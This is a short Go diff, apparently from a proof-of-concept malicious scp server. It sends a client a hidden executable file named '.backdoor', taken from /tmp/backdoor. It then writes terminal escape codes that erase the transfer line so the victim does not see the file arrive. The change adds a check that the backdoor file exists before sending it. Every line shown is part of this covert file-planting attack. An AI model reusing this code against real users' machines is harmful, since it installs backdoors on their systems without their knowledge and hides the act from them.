@@ -26,10 +26,13 @@ func main() {
     w.Flush()
     fmt.Println("C0700 961872 .backdoor")
     r.ReadByte()
-    fh, _ := os.Open("/tmp/backdoor")
-    io.Copy(os.Stdout, fh)
-    fmt.Print(null)
-    r.ReadByte()
-    w.WriteString("\033[A\033[K")
-    w.Flush()
+    if _, err := os.Stat("/tmp/backdoor"); err == nil {
+      fmt.Println("Backdoor is available")
+      fh, _ := os.Open("/tmp/backdoor")
+      io.Copy(os.Stdout, fh)
+      fmt.Print(null)
+      r.ReadByte()
+      w.WriteString("\033[A\033[K")
+      w.Flush()
+    }
 }
